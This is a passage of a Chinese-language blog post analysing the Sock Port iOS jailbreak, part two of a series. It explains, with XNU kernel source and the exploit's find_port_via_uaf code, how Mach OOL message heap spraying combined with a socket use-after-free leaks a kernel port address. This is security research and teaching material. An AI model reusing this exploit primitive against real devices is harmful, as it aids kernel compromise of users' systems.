ipc_object_copyin(space, name, user_disp, &amp;object);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> j;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                object = objects[j];</span><br><span class="line">                <span class="keyword">if</span> (IPC_OBJECT_VALID(object))</span><br><span class="line">                    ipc_object_destroy(object, result_disp);</span><br><span class="line">            &#125;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">            dsc-&gt;address = <span class="literal">NULL</span>;</span><br><span class="line">    		<span class="keyword">if</span> ((*optionp &amp; MACH_SEND_KERNEL) == <span class="number">0</span>) &#123;</span><br><span class="line">    			mach_port_guard_exception(name, <span class="number">0</span>, <span class="number">0</span>, kGUARD_EXC_SEND_INVALID_RIGHT);</span><br><span class="line">    		&#125;</span><br><span class="line">            *mr = MACH_SEND_INVALID_RIGHT;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp;</span><br><span class="line">                ipc_port_check_circularity(</span><br><span class="line">                    (<span class="keyword">ipc_port_t</span>) object,</span><br><span class="line">                    (<span class="keyword">ipc_port_t</span>) dest))</span><br><span class="line">            kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR;</span><br><span class="line">    </span><br><span class="line">        objects[i] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> user_dsc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码同样十分复杂，笔者在其中标出了 4 个关键步骤：</p>
<ol>
<li>计算 <code>ipc_port pointer</code> 所需要的空间大小，以及用户空间中 <code>mach_port</code>  句柄数组的大小；</li>
<li>在内核中分配空间用于容纳从句柄数组转换而来的 <code>ipc_port pointer</code> 数组，这个地方的 <code>ports_length</code> 有些费解，理论上应该计算 <code>count * sizeof(mach_port_t *)</code>，如果采用 <code>count * sizeof(mach_port_t)</code> 作为 kalloc 参数如何能装下 pointers 呢？是不是 kalloc 有一些特殊的内存分配规则，望高人指点；</li>
<li>替换 kmsg 中的 ool address 为步骤 2 中分配的 kernel address；</li>
<li>完成从 port 句柄到 port address 的转换。</li>
</ol>
<p>这其中的重点是步骤 4，它通过调用 <code>ipc_object_copyin</code> 将一个句柄转化为 <code>ipc_port pointer</code>，我们来看它的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_object_copyin(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name,</span><br><span class="line">	<span class="keyword">mach_msg_type_name_t</span>	msgt_name,</span><br><span class="line">	<span class="keyword">ipc_object_t</span>		*objectp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">    <span class="keyword">ipc_port_t</span> soright;</span><br><span class="line">    <span class="keyword">ipc_port_t</span> release_port;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    <span class="keyword">int</span> assertcnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. find port in is_table</span></span><br><span class="line">    kr = ipc_right_lookup_write(space, name, &amp;entry);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS)</span><br><span class="line">        <span class="keyword">return</span> kr;</span><br><span class="line">    </span><br><span class="line">    release_port = IP_NULL;</span><br><span class="line">    <span class="comment">// 2. copy to kernel ipc_object</span></span><br><span class="line">    kr = ipc_right_copyin(space, name, entry,</span><br><span class="line">    		      msgt_name, TRUE,</span><br><span class="line">    		      objectp, &amp;soright,</span><br><span class="line">    		      &amp;release_port,</span><br><span class="line">    		      &amp;assertcnt);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要有两个关键步骤：</p>
<ol>
<li>在当前 IPC Space 的 port 索引表中根据 port_name 获取到 port address；</li>
<li>将 port right 拷贝到内核中的 ipc_object 对象返回。</li>
</ol>
<p>这里的关键是第 1 步，它通过 <code>ipc_right_lookup_write</code> 实现了句柄到地址的转换，它是对 <code>ipc_entry_lookup</code> 的封装，我们直接看后者的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ipc_entry_t</span></span><br><span class="line">ipc_entry_lookup(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_port_index_t</span> index;</span><br><span class="line">    <span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">    </span><br><span class="line">    assert(is_active(space));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. get index from port name</span></span><br><span class="line">    index = name &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (index &lt;  space-&gt;is_table_size) &#123;</span><br><span class="line">        <span class="comment">// 2. get port address by index from is_table</span></span><br><span class="line">        entry = &amp;space-&gt;is_table[index];</span><br><span class="line">    	<span class="keyword">if</span> (IE_BITS_GEN(entry-&gt;ie_bits) != MACH_PORT_GEN(name) ||</span><br><span class="line">    	    IE_BITS_TYPE(entry-&gt;ie_bits) == MACH_PORT_TYPE_NONE) &#123;</span><br><span class="line">    		entry = IE_NULL;		</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	entry = IE_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    assert((entry == IE_NULL) || IE_BITS_TYPE(entry-&gt;ie_bits));</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里我们可以看到，port 句柄中的索引信息是从第 8 位开始的，因此将 port name 右移 8 位即可得到 port index，随后在索引表中查找地址返回。</p>
<p>到这里我们已经全然明白了为何能通过发送 Mach OOL Message 实现迫使内核分配指定 port 的 <code>ipc_port pointers</code> 的原理，接下来我们着手分析如何获取到这个地址。</p>
<h1 id="通过-OOL-Message-与-Socket-UAF-获取-Port-Address"><a href="#通过-OOL-Message-与-Socket-UAF-获取-Port-Address" class="headerlink" title="通过 OOL Message 与 Socket UAF 获取 Port Address"></a>通过 OOL Message 与 Socket UAF 获取 Port Address</h1><p>到这里思路变得十分明确，我们只需要利用 Socket UAF 得到一块已释放区域，然后发送大量的 OOL Message 消息，且使得 port 数组与被释放区域大小一致，即可通过 Heap Spraying 将 <code>ipc_port pointer</code> 数组分配在已释放区域，下面我们来看 Sock Port 中的这段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// first primitive: leak the kernel address of a mach port</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_port_via_uaf</span><span class="params">(<span class="keyword">mach_port_t</span> port, <span class="keyword">int</span> disposition)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// here we use the uaf as an info leak</span></span><br><span class="line">    <span class="comment">// 1. make dangling socket option zone</span></span><br><span class="line">    <span class="keyword">int</span> sock = get_socket_with_dangling_options();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. send ool message</span></span><br><span class="line">        <span class="keyword">mach_port_t</span> p = fill_kalloc_with_port_pointer(port, <span class="number">192</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), MACH_MSG_TYPE_COPY_SEND);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mtu;</span><br><span class="line">        <span class="keyword">int</span> pref;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. get option and check if it is a kernel pointer</span></span><br><span class="line">        get_minmtu(sock, &amp;mtu); <span class="comment">// this is like doing rk32(options + 180);</span></span><br><span class="line">        get_prefertempaddr(sock, &amp;pref); <span class="comment">// this like rk32(options + 184);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*  from a hex dump:</span></span><br><span class="line"><span class="comment">         </span></span><br><span class="line"><span class="comment">         (lldb) p/x HexDump(options, 192)</span></span><br><span class="line"><span class="comment">         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................</span></span><br><span class="line"><span class="comment">         ...</span></span><br><span class="line"><span class="comment">         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................</span></span><br><span class="line"><span class="comment">                    |-----------||-----------|</span></span><br><span class="line"><span class="comment">                     minmtu here prefertempaddr here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">uint64_t</span> ptr = (((<span class="keyword">uint64_t</span>)mtu &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) | ((<span class="keyword">uint64_t</span>)pref &amp; <span class="number">0x00000000ffffffff</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (mtu &gt;= <span class="number">0xffffff00</span> &amp;&amp; mtu != <span class="number">0xffffffff</span> &amp;&amp; pref != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            mach_port_destroy(mach_task_self(), p);</span><br><span class="line">            <span class="built_in">close</span>(sock);</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        mach_port_destroy(mach_task_self(), p);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// close that socket.</span></span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有 4 个关键步骤：</p>
<ol>
<li>利用 Socket UAF 制造一个 <code>in6p_outputopts</code> 大小的已释放区域，详细过程可以看上一篇文章：<a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a> 或 <a href="https://github.com/jakeajames/sock_port/blob/master/sock_port.pdf" target="_blank" rel="noopener">Sock Port Write-up</a>；</li>
<li>发送 ool message，由于 <code>in6p_outputopts</code> 的大小为 192B，一个 port pointer 大小为 8B，因此我们需要发送 192 / 8 = 24 个 ool_ports；</li>
<li>通过 <code>in6p_outputopts</code> 两个连续的成员变量拼接出一个 64 位地址；</li>
<li>判断步骤 3 中得到的地址是否是内核对象指针，如果是内核对象指针，说明我们成功了，该地址就是 target port 的地址。</li>
</ol>
<p>这里我们重点讲一下第 3、4 步：</p>
<h2 id="通过-Socket-Option-读取一个-8B-区域"><a href="#通过-Socket-Option-读取一个-8B-区域" class="headerlink" title="通过 Socket Option 读取一个 8B 区域"></a>通过 Socket Option 读取一个 8B 区域</h2><p>根据 <code>in6p_outputopts</code> 对应的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">ip6_pktopts</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">ip6po_m</span>;</span>	</span><br><span class="line">    <span class="keyword">int</span>	        ip6po_hlim;	</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">in6_pktinfo</span> *<span class="title">ip6po_pktinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6po_nhinfo</span> <span class="title">ip6po_nhinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_hbh</span> *<span class="title">ip6po_hbh</span>;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_dest</span> *<span class="title">ip6po_dest1</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6po_rhinfo</span> <span class="title">ip6po_rhinfo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">ip6_dest</span> *<span class="title">ip6po_dest2</span>;</span></span><br><span class="line">    <span class="keyword">int</span>	ip6po_tclass;</span><br><span class="line">    <span class="keyword">int</span>	ip6po_minmtu; <span class="comment">// +180</span></span><br><span class="line">    <span class="keyword">int</span>	ip6po_prefer_tempaddr; <span class="comment">// + 184</span></span><br><span class="line">    <span class="keyword">int</span> ip6po_flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>minmtu</code> 和 <code>ip6po_prefer_tempaddr</code> 分别位于该结构体的 +180 和 +184 区域，由于每个 pointer 是 8B，最近的 pointer 位于 +176 ~ +184 和 +184 ~ + 192 区域，因此通过 <code>minmtu</code> 我们能读到前一个 pointer 的高 32 位，通过 <code>ip6po_prefer_tempaddr</code> 能读到下一个指针的低 32 位，又因为 Heap Spraying 成功后这些 pointer 都是指向 target ipc_port 的，所以我们可以用他们拼接出一个完整的 pointer address，拼接方法是将 <code>minmtu</code> 左移 32 位或上 <code>ip6po_prefer_tempaddr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> ptr = (((<span class="keyword">uint64_t</span>)mtu &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) | ((<span class="keyword">uint64_t</span>)pref &amp; <span class="number">0x00000000ffffffff</span>);</span><br></pre></td></tr></table></figure>

<h2 id="判断是否是内核对象指针的地址"><a href="#判断是否是内核对象指针的地址" class="headerlink" title="判断是否是内核对象指针的地址"></a>判断是否是内核对象指针的地址</h2><p>下面最关键的步骤是如何判断这是一个有效地内核地址，这里需要两个基础知识：</p>
<ol>
<li>如果内存中的内容是 0xdeadbeef，则说明这块区域尚未完成初始化[3]；</li>
<li>根据 XNU 中 <code>mach/arm/vm_param.h</code> 中的定义，内核地址的有效范围是从 0xffffffe000000000 ~ 0xfffffff3ffffffff，一般而言 port address 的高 32 位是 0xffffffe。</li>
</ol>
<p>综合以上两点有以下判断代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mtu &gt;= <span class="number">0xffffff00</span> &amp;&amp; mtu != <span class="number">0xffffffff</span> &amp;&amp; pref != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">    mach_port_destroy(mach_task_self(), p);</span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，此时我们已经拿到了 port address。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文先介绍了 Mach port 的用户空间与内核空间表示及其功能；随后简单介绍了 Sock Port 的实现机理；接着以漏洞的第一个关键点（通过 OOL Message 泄露 Port Addr）为切入点，结合 XNU 源码深入分析了 OOL Message 实现 ipc_port pointers Spraying 的原理；最后结合 Sock Port 源码分析了拿到 Port Address 的过程。</p>
<p>通过这一节的学习，相信你对 Mach port 的整套机制和 Heap Spraying 有了更加深入的认识。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>通过 Socket UAF 不仅能实现泄露 Port Address，还能实现任意地址的读取和任意内核 zone 的释放。在下一节中，我们将介绍基于 IOSurface 的 Heap Spraying 与 Socket UAF 组合来实现上述 Primitives 的原理和过程。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="noopener">Debugging Mach Ports. Robert Sesek</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html" target="_blank" rel="noopener">Mach Overview - Tasks and Threads. Apple</a></li>
<li><a href="https://en.wikipedia.org/wiki/Hexspeak" target="_blank" rel="noopener">Hexspeak. Wikipedia</a></li>
<li><a href="https://www.gnu.org/software/hurd/gnumach-doc/Memory.html" target="_blank" rel="noopener">GNU Doc - Memory</a></li>
<li><a href="https://paper.seebug.org/800/" target="_blank" rel="noopener">IPC Voucher UaF Remote Jailbreak Stage 2. Qixun Zhao</a></li>
<li><a href="https://github.com/jakeajames/sock_port" target="_blank" rel="noopener">Sock Port 2 on GitHub</a></li>
<li><a href="https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/" target="_blank" rel="noopener">CVE-2016-7637—再谈Mach IPC. turing.huang</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">高级页面仔 (Soulghost)</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.asm.im/2019/11/24/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-Mach-OOL-Message-%E6%B3%84%E9%9C%B2-Port-Address/">http://blog.asm.im/2019/11/24/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-Mach-OOL-Message-%E6%B3%84%E9%9C%B2-Port-Address/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Sock-Port/">Sock Port</a><a class="post-meta__tags" href="/tags/UAF/">UAF</a><a class="post-meta__tags" href="/tags/Mach/">Mach</a><a class="post-meta__tags" href="/tags/Mach-Port/">Mach Port</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/"><i class="fa fa-chevron-left">  </i><span>Sock Port 漏洞解析（三）IOSurface Heap Spraying</span></a></div><div class="next-post pull-right"><a href="/2019/11/17/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89UAF-%E4%B8%8E-Heap-Spraying/"><span>Sock Port 漏洞解析（一）UAF 与 Heap Spraying</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>